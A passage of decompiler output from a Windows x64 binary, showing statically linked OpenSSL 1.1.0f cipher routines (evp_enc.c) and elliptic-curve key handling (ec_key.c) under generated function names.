  __int64 v2; // rax
  int v3; // r8d
  __int64 (__fastcall *v4)(_DWORD *, __int64, _QWORD); // r10
  __int64 result; // rax

  v2 = *(_QWORD *)a1;
  v3 = *(_DWORD *)(*(_QWORD *)a1 + 16i64);
  if ( (v3 & 0x80u) != 0 )
  {
    if ( v2 )
    {
      v4 = *(__int64 (__fastcall **)(_DWORD *, __int64, _QWORD))(v2 + 72);
      if ( v4 )
      {
        result = v4(a1, 1i64, (unsigned int)a2);
        if ( (_DWORD)result != -1 )
          return result;
        sub_140024610(6, 124, 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 592);
      }
      else
      {
        sub_140024610(6, 124, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 585);
      }
    }
    else
    {
      sub_140024610(6, 124, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 580);
    }
    return 0i64;
  }
  if ( a1[26] == a2 )
    return 1i64;
  if ( a2 > 0 && (v3 & 8) != 0 )
  {
    a1[26] = a2;
    return 1i64;
  }
  sub_140024610(6, 122, 130, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 563);
  return 0i64;
}

//----- (000000014001B750) ----------------------------------------------------
__int64 __fastcall sub_14001B750(__int64 a1, int a2)
{
  __int64 result; // rax

  result = 1i64;
  if ( a2 )
    *(_DWORD *)(a1 + 108) &= ~0x100u;
  else
    *(_DWORD *)(a1 + 108) |= 0x100u;
  return result;
}

//----- (000000014001B770) ----------------------------------------------------
__int64 __fastcall sub_14001B770(unsigned int *a1, __int64 a2, int *a3)
{
  if ( a1[4] )
    return sub_14001BF20(a1, a2, a3);
  else
    return sub_14001BB00((char *)a1, (_BYTE *)a2, a3);
}

//----- (000000014001B7A0) ----------------------------------------------------
__int64 __fastcall sub_14001B7A0(_DWORD *a1, int *a2, __int64 a3, __int64 a4, void *Src, int a6)
{
  int *v8; // rsi
  unsigned int v10; // r14d
  int v11; // ebx
  __int64 result; // rax
  void *v13; // rax
  int v14; // eax
  unsigned int v15; // ecx
  int v16; // eax
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  signed int NumTryBlocks; // eax
  signed int v21; // eax
  const void *v22; // rdx
  __int64 v23; // rcx
  int v24; // [rsp+20h] [rbp-28h]

  v8 = a2;
  if ( a6 == -1 )
  {
    v10 = a1[4];
  }
  else
  {
    v10 = a6 != 0;
    a1[4] = v10;
  }
  if ( !*((_QWORD *)a1 + 1) || !*(_QWORD *)a1 || a2 && *a2 != **(_DWORD **)a1 )
  {
    if ( a2 )
    {
      if ( *(_QWORD *)a1 )
      {
        v11 = a1[27];
        sub_14001B600();
        a1[4] = v10;
        a1[27] = v11;
      }
      if ( a3 )
      {
        if ( !(unsigned int)sub_140025980(a3) )
        {
          v24 = 95;
LABEL_14:
          sub_140024610(6, 123, 134, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", v24);
          return 0i64;
        }
      }
      else
      {
        a3 = sub_140025760(*v8);
      }
      if ( a3 )
      {
        v8 = (int *)sub_140025700(a3, *v8);
        if ( !v8 )
        {
          v24 = 110;
          goto LABEL_14;
        }
        *((_QWORD *)a1 + 1) = a3;
      }
      else
      {
        *((_QWORD *)a1 + 1) = 0i64;
      }
      *(_QWORD *)a1 = v8;
      if ( v8[12] )
      {
        v13 = sub_14001DC20(v8[12]);
        *((_QWORD *)a1 + 14) = v13;
        if ( !v13 )
        {
          *(_QWORD *)a1 = 0i64;
          sub_140024610(6, 123, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 129);
          return 0i64;
        }
      }
      else
      {
        *((_QWORD *)a1 + 14) = 0i64;
      }
      v14 = v8[2];
      a1[27] &= 1u;
      a1[26] = v14;
      if ( (*(_BYTE *)(*(_QWORD *)a1 + 16i64) & 0x40) != 0 && !(unsigned int)sub_14001B470((__int64)a1) )
      {
        *(_QWORD *)a1 = 0i64;
        v24 = 141;
        goto LABEL_14;
      }
    }
    else if ( !*(_QWORD *)a1 )
    {
      sub_140024610(6, 123, 131, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 146);
      return 0i64;
    }
  }
  v15 = *(_DWORD *)(*(_QWORD *)a1 + 4i64);
  if ( v15 > 0x10 || (v16 = 65794, !_bittest(&v16, v15)) )
    sub_1400234A0(
      "assertion failed: ctx->cipher->block_size == 1 || ctx->cipher->block_size == 8 || ctx->cipher->block_size == 16",
      "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c",
      155i64);
  if ( (a1[27] & 1) == 0 )
  {
    v17 = sub_140021BD0((__int64)a1);
    if ( (sub_140024CF0(v17) & 0xF0007) == 65538 )
    {
      sub_140024610(6, 123, 170, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 159);
      return 0i64;
    }
  }
  v18 = sub_140021BD0((__int64)a1);
  if ( (sub_140024CF0(v18) & 0x10) == 0 )
  {
    v19 = sub_140021BD0((__int64)a1);
    switch ( sub_140024CF0(v19) & 0xF0007 )
    {
      case 0i64:
      case 1i64:
        goto LABEL_48;
      case 2i64:
        goto LABEL_40;
      case 3i64:
      case 4i64:
        a1[22] = 0;
LABEL_40:
        if ( (int)__FrameHandler3::TryBlockMap::getNumTryBlocks((__FrameHandler3::TryBlockMap *)a1) > 16 )
          sub_1400234A0(
            "assertion failed: EVP_CIPHER_CTX_iv_length(ctx) <= (int)sizeof(ctx->iv)",
            "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c",
            179i64);
        if ( Src )
        {
          NumTryBlocks = __FrameHandler3::TryBlockMap::getNumTryBlocks((__FrameHandler3::TryBlockMap *)a1);
          memmove(a1 + 6, Src, NumTryBlocks);
        }
        v21 = __FrameHandler3::TryBlockMap::getNumTryBlocks((__FrameHandler3::TryBlockMap *)a1);
        v22 = a1 + 6;
        break;
      case 5i64:
        a1[22] = 0;
        if ( !Src )
          goto LABEL_48;
        v21 = __FrameHandler3::TryBlockMap::getNumTryBlocks((__FrameHandler3::TryBlockMap *)a1);
        v22 = Src;
        break;
      default:
        return 0i64;
    }
    memmove(a1 + 10, v22, v21);
  }
LABEL_48:
  if ( (a4 || (*(_BYTE *)(*(_QWORD *)a1 + 16i64) & 0x20) != 0)
    && !(*(unsigned int (__fastcall **)(_DWORD *, __int64, void *, _QWORD))(*(_QWORD *)a1 + 24i64))(a1, a4, Src, v10) )
  {
    return 0i64;
  }
  v23 = *(_QWORD *)a1;
  result = 1i64;
  a1[5] = 0;
  a1[30] = 0;
  a1[31] = *(_DWORD *)(v23 + 4) - 1;
  return result;
}
// 14001B600: using guessed type __int64 sub_14001B600(void);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014001BAD0) ----------------------------------------------------
__int64 __fastcall sub_14001BAD0(int *a1, char *a2, int *a3, char *a4, int a5)
{
  if ( a1[4] )
    return sub_14001C080(a1, a2, a3, a4, a5);
  else
    return sub_14001BCD0(a1, a2, a3, a4, a5);
}

//----- (000000014001BB00) ----------------------------------------------------
__int64 __fastcall sub_14001BB00(char *a1, _BYTE *a2, int *a3)
{
  int v3; // edi
  _BYTE *v5; // rbx
  __int64 v6; // rax
  int v8; // eax
  __int64 v10; // rbp
  __int64 v11; // rax
  int v12; // edx
  int v13; // r8d
  __int64 v14; // rcx
  __int64 v15; // rsi

  v3 = 0;
  *a3 = 0;
  v5 = a2;
  v6 = *(_QWORD *)a1;
  if ( (*(_DWORD *)(*(_QWORD *)a1 + 16i64) & 0x100000) == 0 )
  {
    LODWORD(v10) = *(_DWORD *)(v6 + 4);
    if ( (*((_DWORD *)a1 + 27) & 0x100) != 0 )
    {
      if ( *((_DWORD *)a1 + 5) )
      {
        sub_140024610(6, 101, 138, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 516);
        return 0i64;
      }
    }
    else if ( (unsigned int)v10 > 1 )
    {
      if ( *((_DWORD *)a1 + 5) || !*((_DWORD *)a1 + 30) )
      {
        sub_140024610(6, 101, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 524);
        return 0i64;
      }
      if ( (unsigned int)v10 > 0x20 )
        sub_1400234A0(
          "assertion failed: b <= sizeof ctx->final",
          "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c",
          527i64);
      v11 = (unsigned int)(v10 - 1);
      v12 = (unsigned __int8)a1[v11 + 128];
      if ( a1[v11 + 128] && v12 <= (int)v10 )
      {
        if ( !a1[v11 + 128] )
        {
LABEL_18:
          v13 = *(_DWORD *)(*(_QWORD *)a1 + 4i64) - v12;
          v14 = v13;
          if ( *(_DWORD *)(*(_QWORD *)a1 + 4i64) - v12 > 0 )
          {
            v15 = a1 - v5;
            do
            {
              *v5 = v5[v15 + 128];
              ++v5;
              --v14;
            }
            while ( v14 );
          }
          *a3 = v13;
          return 1i64;
        }
        while ( 1 )
        {
          v10 = (unsigned int)(v10 - 1);
          if ( (unsigned __int8)a1[v10 + 128] != v12 )
            break;
          if ( ++v3 >= v12 )
            goto LABEL_18;
        }
        sub_140024610(6, 101, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 540);
      }
      else
      {
        sub_140024610(6, 101, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 535);
      }
      return 0i64;
    }
    *a3 = 0;
    return 1i64;
  }
  v8 = (*(__int64 (__fastcall **)(char *, _BYTE *, _QWORD, _QWORD))(v6 + 32))(a1, a2, 0i64, 0i64);
  if ( v8 < 0 )
    return 0i64;
  *a3 = v8;
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014001BCA0) ----------------------------------------------------
__int64 __fastcall sub_14001BCA0(_DWORD *a1, int *a2, __int64 a3, __int64 a4, void *Src)
{
  return sub_14001B7A0(a1, a2, a3, a4, Src, 0);
}

//----- (000000014001BCD0) ----------------------------------------------------
__int64 __fastcall sub_14001BCD0(int *a1, char *a2, int *a3, char *a4, int a5)
{
  int v9; // ebx
  size_t v10; // rbp
  int v12; // eax
  int v13; // ebx

  v9 = a5;
  v10 = *(unsigned int *)(*(_QWORD *)a1 + 4i64);
  if ( (unsigned int)sub_140024D80((__int64)a1, 0x2000u) )
    v9 = (a5 + 7) / 8;
  if ( (*(_DWORD *)(*(_QWORD *)a1 + 16i64) & 0x100000) != 0 )
  {
    if ( (_DWORD)v10 == 1
      && a2 != a4
      && (a2 - a4 < (unsigned __int64)v9 || a2 - a4 > (unsigned __int64)-(__int64)v9)
      && v9 > 0 )
    {
      sub_140024610(6, 166, 162, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 434);
      return 0i64;
    }
    v12 = (*(__int64 (__fastcall **)(int *, char *, char *, _QWORD))(*(_QWORD *)a1 + 32i64))(a1, a2, a4, a5);
    if ( v12 < 0 )
    {
      *a3 = 0;
      return 0i64;
    }
    *a3 = v12;
  }
  else
  {
    if ( a5 <= 0 )
    {
      *a3 = 0;
      return a5 == 0;
    }
    if ( (a1[27] & 0x100) != 0 )
      return sub_14001C080(a1, a2, a3, a4, a5);
    if ( (unsigned int)v10 > 0x20 )
      sub_1400234A0(
        "assertion failed: b <= sizeof ctx->final",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c",
        455i64);
    if ( a1[30] )
    {
      if ( a2 == a4
        || a2 != a4
        && (a2 - a4 < (unsigned __int64)(int)v10 || a2 - a4 > (unsigned __int64)-(__int64)(int)v10)
        && (int)v10 > 0 )
      {
        sub_140024610(6, 166, 162, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 461);
        return 0i64;
      }
      memmove(a2, a1 + 32, v10);
      a2 += v10;
      v13 = 1;
    }
    else
    {
      v13 = 0;
    }
    if ( !(unsigned int)sub_14001C080(a1, a2, a3, a4, a5) )
      return 0i64;
    if ( (unsigned int)v10 <= 1 || a1[5] )
    {
      a1[30] = 0;
    }
    else
    {
      *a3 -= v10;
      a1[30] = 1;
      memmove(a1 + 32, &a2[*a3], v10);
    }
    if ( v13 )
      *a3 += v10;
  }
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014001BF20) ----------------------------------------------------
__int64 __fastcall sub_14001BF20(unsigned int *a1, __int64 a2, int *a3)
{
  __int64 v3; // rax
  int v5; // eax
  __int64 result; // rax
  __int64 v7; // rbx
  __int64 v8; // rax

  v3 = *(_QWORD *)a1;
  if ( (*(_DWORD *)(*(_QWORD *)a1 + 16i64) & 0x100000) != 0 )
  {
    v5 = (*(__int64 (__fastcall **)(unsigned int *, __int64, _QWORD, _QWORD))(v3 + 32))(a1, a2, 0i64, 0i64);
    if ( v5 < 0 )
      return 0i64;
    *a3 = v5;
    return 1i64;
  }
  v7 = *(unsigned int *)(v3 + 4);
  if ( (unsigned int)v7 > 0x20 )
    sub_1400234A0("assertion failed: b <= sizeof ctx->buf", "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 394i64);
  if ( (_DWORD)v7 == 1 )
  {
LABEL_11:
    *a3 = 0;
    return 1i64;
  }
  v8 = a1[5];
  if ( (a1[27] & 0x100) != 0 )
  {
    if ( (_DWORD)v8 )
    {
      sub_140024610(6, 127, 138, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 403);
      return 0i64;
    }
    goto LABEL_11;
  }
  if ( (unsigned int)v8 < (unsigned int)v7 )
    memset((char *)a1 + v8 + 56, v7 - v8, (int)v7 - (int)v8);
  result = (*(__int64 (__fastcall **)(unsigned int *, __int64, unsigned int *, __int64))(*(_QWORD *)a1 + 32i64))(
             a1,
             a2,
             a1 + 14,
             v7);
  if ( (_DWORD)result )
    *a3 = v7;
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014001C050) ----------------------------------------------------
__int64 __fastcall sub_14001C050(_DWORD *a1, int *a2, __int64 a3, __int64 a4, void *Src)
{
  return sub_14001B7A0(a1, a2, a3, a4, Src, 1);
}

//----- (000000014001C080) ----------------------------------------------------
__int64 __fastcall sub_14001C080(int *a1, char *a2, int *a3, char *a4, int a5)
{
  int v5; // edi
  int v10; // r9d
  __int64 v11; // r10
  __int64 v12; // rbp
  int v14; // eax
  unsigned int v15; // ebx
  __int64 v16; // r13
  int v17; // eax
  char *v18; // rcx
  __int64 v19; // rbx
  int v20; // ebx
  int v21; // edi

  v5 = a5;
  if ( (unsigned int)sub_140024D80((__int64)a1, 0x2000u) )
    v10 = (a5 + 7) / 8;
  else
    v10 = a5;
  v11 = *(_QWORD *)a1;
  v12 = *(int *)(*(_QWORD *)a1 + 4i64);
  if ( (*(_DWORD *)(*(_QWORD *)a1 + 16i64) & 0x100000) == 0 )
  {
    v15 = 0;
    if ( a5 <= 0 )
    {
      *a3 = 0;
      LOBYTE(v15) = a5 == 0;
      return v15;
    }
    v16 = a1[5];
    if ( &a2[v16 - (_QWORD)a4] != 0i64
      && ((unsigned __int64)&a2[v16 - (_QWORD)a4] < v10 || (unsigned __int64)&a2[v16 - (_QWORD)a4] > -(__int64)v10)
      && v10 > 0 )
    {
      sub_140024610(6, 167, 162, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 325);
      return 0i64;
    }
    if ( !(_DWORD)v16 && (a5 & a1[31]) == 0 )
    {
      if ( (*(unsigned int (__fastcall **)(int *, char *, char *, _QWORD))(v11 + 32))(a1, a2, a4, a5) )
      {
        *a3 = a5;
        return 1i64;
      }
      *a3 = 0;
      return 0i64;
    }
    if ( (int)v12 > 32 )
      sub_1400234A0(
        "assertion failed: bl <= (int)sizeof(ctx->buf)",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c",
        339i64);
    if ( (_DWORD)v16 )
    {
      v17 = v12 - v16;
      v18 = (char *)a1 + v16 + 56;
      if ( (int)v12 - (int)v16 > a5 )
      {
        memmove(v18, a4, a5);
        a1[5] += a5;
        *a3 = 0;
        return 1i64;
      }
      v19 = v17;
      memmove(v18, a4, v17);
      v5 = a5 - (v12 - v16);
      a4 += v19;
      if ( !(*(unsigned int (__fastcall **)(int *, char *, int *, __int64))(*(_QWORD *)a1 + 32i64))(
              a1,
              a2,
              a1 + 14,
              v12) )
        return 0i64;
      a2 += v12;
      *a3 = v12;
    }
    else
    {
      *a3 = 0;
    }
    v20 = v5 & (v12 - 1);
    v21 = v5 - v20;
    if ( v21 > 0 )
    {
      if ( !(*(unsigned int (__fastcall **)(int *, char *, char *, _QWORD))(*(_QWORD *)a1 + 32i64))(a1, a2, a4, v21) )
        return 0i64;
      *a3 += v21;
    }
    if ( v20 )
      memmove(a1 + 14, &a4[v21], v20);
    a1[5] = v20;
    return 1i64;
  }
  if ( (_DWORD)v12 == 1
    && a2 != a4
    && (a2 - a4 < (unsigned __int64)v10 || a2 - a4 > (unsigned __int64)-(__int64)v10)
    && v10 > 0 )
  {
    sub_140024610(6, 167, 162, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 308);
    return 0i64;
  }
  v14 = (*(__int64 (__fastcall **)(int *, char *, char *, _QWORD))(v11 + 32))(a1, a2, a4, a5);
  if ( v14 < 0 )
    return 0i64;
  *a3 = v14;
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014001C310) ----------------------------------------------------
__int64 __fastcall sub_14001C310(__int64 a1, __int64 a2, int a3)
{
  return (a3 > 0) & (unsigned __int8)(a1 != a2
                                   && (a1 - a2 < (unsigned __int64)a3 || a1 - a2 > (unsigned __int64)-(__int64)a3));
}

//----- (000000014001C360) ----------------------------------------------------
_BOOL8 __fastcall sub_14001C360(__int64 a1)
{
  _BYTE **v1; // rax
  _BYTE *v2; // rax
  _BOOL8 result; // rax

  v1 = *(_BYTE ***)(a1 + 24);
  result = 0;
  if ( v1 )
  {
    v2 = *v1;
    if ( v2 )
    {
      if ( (*v2 & 4) == 0 )
        return 1;
    }
  }
  return result;
}

//----- (000000014001C380) ----------------------------------------------------
void __fastcall sub_14001C380(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 60) &= ~a2;
}

//----- (000000014001C390) ----------------------------------------------------
__int64 __fastcall sub_14001C390(__int64 a1, __int64 a2)
{
  void (*v4)(void); // rdx
  __int64 v5; // rax
  void (__fastcall *v6)(__int64); // rdx
  __int64 v7; // rcx
  __int64 v8; // rbx
  _QWORD *v9; // rax
  _QWORD *v10; // rax
  _DWORD *v11; // rax
  unsigned int (__fastcall *v12)(__int64, __int64); // rax
  __int64 v13; // rcx
  unsigned int (__fastcall *v14)(__int64, __int64); // r8

  if ( a1 && a2 )
  {
    if ( *(_QWORD *)a2 != *(_QWORD *)a1 )
    {
      v4 = *(void (**)(void))(*(_QWORD *)a1 + 24i64);
      if ( v4 )
        v4();
      v5 = *(_QWORD *)(a1 + 24);
      if ( v5 )
      {
        v6 = *(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 368i64);
        if ( v6 )
          v6(a1);
      }
      if ( !(unsigned int)sub_140025890(*(_QWORD *)(a1 + 8)) )
        return 0i64;
      *(_QWORD *)(a1 + 8) = 0i64;
    }
    v7 = *(_QWORD *)(a2 + 24);
    if ( !v7 )
      goto LABEL_35;
    v8 = sub_140021BD0(v7);
    sub_140021910(*(__int64 **)(a1 + 24));
    v9 = sub_140021BE0(v8);
    *(_QWORD *)(a1 + 24) = v9;
    if ( v9 )
    {
      if ( (unsigned int)sub_140021650((__int64)v9, *(_QWORD *)(a2 + 24)) )
      {
        if ( !*(_QWORD *)(a2 + 32)
          || (sub_1400222C0(*(void **)(a1 + 32)),
              v10 = sub_140022670(*(__int64 **)(a2 + 24)),
              (*(_QWORD *)(a1 + 32) = v10) != 0i64)
          && (unsigned int)sub_140022150(v10, *(_QWORD **)(a2 + 32)) )
        {
          if ( !*(_QWORD *)(a2 + 40)
            || (*(_QWORD *)(a1 + 40) || (v11 = sub_140027200(), (*(_QWORD *)(a1 + 40) = v11) != 0i64))
            && sub_140026E90(*(_QWORD *)(a1 + 40), *(_QWORD *)(a2 + 40))
            && ((v12 = *(unsigned int (__fastcall **)(__int64, __int64))(**(_QWORD **)(a2 + 24) + 360i64)) == 0i64
             || v12(a1, a2)) )
          {
LABEL_35:
            *(_DWORD *)(a1 + 48) = *(_DWORD *)(a2 + 48);
            *(_DWORD *)(a1 + 52) = *(_DWORD *)(a2 + 52);
            *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
            *(_DWORD *)(a1 + 60) = *(_DWORD *)(a2 + 60);
            if ( (unsigned int)sub_140025D70(8u, (unsigned int **)(a1 + 64), (unsigned int **)(a2 + 64)) )
            {
              if ( *(_QWORD *)a2 != *(_QWORD *)a1 )
              {
                v13 = *(_QWORD *)(a2 + 8);
                if ( v13 && !(unsigned int)sub_140025980(v13) )
                  return 0i64;
                *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
                *(_QWORD *)a1 = *(_QWORD *)a2;
              }
              v14 = *(unsigned int (__fastcall **)(__int64, __int64))(*(_QWORD *)a2 + 32i64);
              if ( !v14 || v14(a1, a2) )
                return a1;
            }
          }
        }
      }
    }
  }
  else
  {
    sub_140024610(16, 178, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 80);
  }
  return 0i64;
}

//----- (000000014001C5A0) ----------------------------------------------------
__int64 __fastcall sub_14001C5A0(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx

  v2 = sub_1400291E0(*(_QWORD *)(a1 + 8));
  v3 = v2;
  if ( !v2 )
    return 0i64;
  if ( !sub_14001C390(v2, a1) )
  {
    sub_14001C600(v3);
    return 0i64;
  }
  return v3;
}

//----- (000000014001C600) ----------------------------------------------------
void __fastcall sub_14001C600(__int64 a1)
{
  void (__fastcall *v2)(__int64); // rdx
  __int64 v3; // rax
  void (__fastcall *v4)(__int64); // rdx
  int v5; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    sub_140025D60((_DWORD *)(a1 + 56), -1, &v5);
    if ( v5 <= 0 )
    {
      v2 = *(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 24i64);
      if ( v2 )
        v2(a1);
      sub_140025890(*(_QWORD *)(a1 + 8));
      v3 = *(_QWORD *)(a1 + 24);
      if ( v3 )
      {
        v4 = *(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 368i64);
        if ( v4 )
          v4(a1);
      }
      sub_140025FB0(8u, a1, (__int64 *)(a1 + 64));
      sub_140025BE0(*(_DWORD **)(a1 + 72));
      sub_140021910(*(__int64 **)(a1 + 24));
      sub_1400222C0(*(void **)(a1 + 32));
      sub_140026A10(*(__int64 **)(a1 + 40));
      sub_14001DA40((void *)a1, 80i64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 0x4Au);
    }
  }
}

//----- (000000014001C6D0) ----------------------------------------------------
__int64 __fastcall sub_14001C6D0(_QWORD *a1)
{
  __int64 (*v1)(void); // rdx

  if ( a1 && a1[3] )
  {
    v1 = *(__int64 (**)(void))(*a1 + 64i64);
    if ( v1 )
      return v1();
    sub_140024610(16, 179, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 188);
  }
  else
  {
    sub_140024610(16, 179, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 183);
  }
  return 0i64;
}

//----- (000000014001C740) ----------------------------------------------------
__int64 __fastcall sub_14001C740(__int64 a1)
{
  return *(_QWORD *)(a1 + 24);
}

//----- (000000014001C770) ----------------------------------------------------
__int64 __fastcall sub_14001C770(__int64 a1)
{
  return *(unsigned int *)(a1 + 52);
}

//----- (000000014001C780) ----------------------------------------------------
__int64 __fastcall sub_14001C780(__int64 a1)
{
  return *(unsigned int *)(a1 + 48);
}

//----- (000000014001C790) ----------------------------------------------------
__int64 __fastcall sub_14001C790(__int64 a1)
{
  return *(unsigned int *)(a1 + 60);
}

//----- (000000014001C7A0) ----------------------------------------------------
__int64 __fastcall sub_14001C7A0(__int64 a1, int a2, _QWORD *a3, int *a4)
{
  _QWORD *v5; // rdx
  __int64 v6; // rcx

  if ( a1 && (v5 = *(_QWORD **)(a1 + 32)) != 0i64 && (v6 = *(_QWORD *)(a1 + 24)) != 0 )
    return sub_140028DE0(v6, v5, a2, a3, a4);
  else
    return 0i64;
}

//----- (000000014001C7F0) ----------------------------------------------------
__int64 sub_14001C7F0()
{
  return sub_1400291E0(0i64);
}

//----- (000000014001C810) ----------------------------------------------------
_QWORD *__fastcall sub_14001C810(int a1)
{
  _QWORD *v2; // rbx
  unsigned __int64 v3; // rax
  unsigned int (__fastcall *v5)(_QWORD *, unsigned __int64); // r8

  v2 = (_QWORD *)sub_1400291E0(0i64);
  if ( !v2 )
    return 0i64;
  v3 = sub_140028760(a1);
  v2[3] = v3;
  if ( !v3 || (v5 = *(unsigned int (__fastcall **)(_QWORD *, unsigned __int64))(*v2 + 40i64)) != 0i64 && !v5(v2, v3) )
  {
    sub_14001C600((__int64)v2);
    return 0i64;
  }
  return v2;
}

//----- (000000014001C880) ----------------------------------------------------
__int64 __fastcall sub_14001C880(__int64 a1, _BYTE *a2, __int64 a3, int *a4)
{
  __int64 *v8; // rcx
  _QWORD *v9; // rdx

  if ( !a1 )
    return 0i64;
  v8 = *(__int64 **)(a1 + 24);
  if ( !v8 )
    return 0i64;
  if ( !*(_QWORD *)(a1 + 32) )
    *(_QWORD *)(a1 + 32) = sub_140022670(v8);
  v9 = *(_QWORD **)(a1 + 32);
  if ( !v9 || !(unsigned int)sub_140028D30(*(__int64 **)(a1 + 24), v9, a2, a3, a4) )
    return 0i64;
  if ( (***(_BYTE ***)(a1 + 24) & 2) == 0 )
    *(_DWORD *)(a1 + 52) = *a2 & 0xFE;
  return 1i64;
}

//----- (000000014001C920) ----------------------------------------------------
__int64 __fastcall sub_14001C920(__int64 a1)
{
  __int64 *v1; // rax
  __int64 v2; // rax
  __int64 (*v3)(void); // r9

  v1 = *(__int64 **)(a1 + 24);
  if ( !v1 )
    return 0i64;
  v2 = *v1;
  if ( !v2 )
    return 0i64;
  v3 = *(__int64 (**)(void))(v2 + 320);
  if ( !v3 )
  {
    sub_140024610(16, 255, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 590);
    return 0i64;
  }
  return v3();
}

//----- (000000014001C980) ----------------------------------------------------
__int64 __fastcall sub_14001C980(__int64 a1, _QWORD *a2)
{
  __int64 *v2; // rax
  __int64 v5; // rax
  __int64 (__fastcall *v6)(__int64, _QWORD, _QWORD); // r9
  __int64 result; // rax
  size_t v8; // rax
  void *v9; // rbx

  v2 = *(__int64 **)(a1 + 24);
  if ( !v2 )
    return 0i64;
  v5 = *v2;
  if ( !v5 )
    return 0i64;
  v6 = *(__int64 (__fastcall **)(__int64, _QWORD, _QWORD))(v5 + 312);
  if ( !v6 )
  {
    sub_140024610(16, 256, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 555);
    return 0i64;
  }
  v8 = v6(a1, 0i64, 0i64);
  if ( !v8 )
    return 0i64;
  v9 = sub_14001D8E0(v8);
  if ( v9 )
  {
    result = sub_14001CA70(a1);
    if ( result )
    {
      *a2 = v9;
      return result;
    }
    sub_14001D930(v9);
  }
  return 0i64;
}

//----- (000000014001CA70) ----------------------------------------------------
__int64 __fastcall sub_14001CA70(__int64 a1)
{
  __int64 *v1; // rax
  __int64 v2; // rax
  __int64 (*v3)(void); // r9

  v1 = *(__int64 **)(a1 + 24);
  if ( !v1 )
    return 0i64;
  v2 = *v1;
  if ( !v2 )
    return 0i64;
  v3 = *(__int64 (**)(void))(v2 + 312);
  if ( !v3 )
  {
    sub_140024610(16, 256, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_key.c", 555);
    return 0i64;
  }
  return v3();
}

//----- (000000014001CAD0) ----------------------------------------------------
void __fastcall sub_14001CAD0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 48) = a2;
}

//----- (000000014001CAE0) ----------------------------------------------------
void __fastcall sub_14001CAE0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 60) |= a2;
}

//----- (000000014001CAF0) ----------------------------------------------------
__int64 __fastcall sub_14001CAF0(__int64 **a1, __int64 *a2)
{
  __int64 (*v4)(void); // r8
  __int64 result; // rax
  __int64 *v6; // rax

  v4 = (__int64 (*)(void))(*a1)[5];
  if ( !v4 || (result = v4(), (_DWORD)result) )
  {
    sub_140021910(a1[3]);
    v6 = sub_1400218A0(a2);
    a1[3] = v6;
    return v6 != 0i64;
  }
  return result;
}

//----- (000000014001CB60) ----------------------------------------------------
__int64 __fastcall sub_14001CB60(__int64 a1, _QWORD *a2)
{
  __int64 (*v4)(void); // r8
  __int64 result; // rax
  void *v6; // rax

  v4 = *(__int64 (**)(void))(*(_QWORD *)a1 + 56i64);
  if ( !v4 || (result = v4(), (_DWORD)result) )
  {
    sub_1400222C0(*(void **)(a1 + 32));
    v6 = sub_140022250(a2, *(__int64 **)(a1 + 24));
    *(_QWORD *)(a1 + 32) = v6;
    return v6 != 0i64;
  }
  return result;
}

